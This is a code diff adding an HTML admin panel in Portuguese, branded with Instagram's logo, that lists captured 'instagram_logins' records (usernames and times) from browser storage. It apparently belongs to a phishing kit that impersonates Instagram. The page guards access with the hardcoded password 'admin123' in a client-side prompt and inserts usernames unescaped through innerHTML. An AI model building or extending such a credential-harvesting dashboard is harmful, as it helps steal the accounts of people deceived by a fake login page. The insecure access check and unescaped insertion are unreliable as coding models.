@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Admin</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { padding: 20px; background-color: #fafafa; }
+        .admin-container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); padding: 20px; }
+        h1 { color: #262626; margin-bottom: 20px; display: flex; align-items: center; }
+        h1 img { height: 40px; margin-right: 15px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #dbdbdb; }
+        th { background-color: #fafafa; font-weight: 600; color: #262626; }
+        .logout-btn { background: #0095f6; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; float: right; }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <h1>
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            Painel de Administração
+        </h1>
+        <button class="logout-btn" onclick="window.location.href='index.html'">Sair</button>
+        <div style="clear: both;"></div>
+        
+        <h2>Registros de Login</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Usuário</th>
+                    <th>Data/Hora</th>
+                </tr>
+            </thead>
+            <tbody id="loginsTable">
+                <!-- Dados serão inseridos aqui -->
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Senha de acesso (altere para uma senha segura!)
+            const ADMIN_PASSWORD = 'admin123';
+            
+            if(prompt('Digite a senha do painel:') !== ADMIN_PASSWORD) {
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            // Simulação de dados (em produção, conecte a um banco de dados)
+            const logins = JSON.parse(localStorage.getItem('instagram_logins') || '[]');
+            const tableBody = document.getElementById('loginsTable');
+            
+            logins.reverse().forEach(login => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${login.username}</td>
+                    <td>${new Date(login.timestamp).toLocaleString()}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        });
+    </script>
+</body>
+</html>
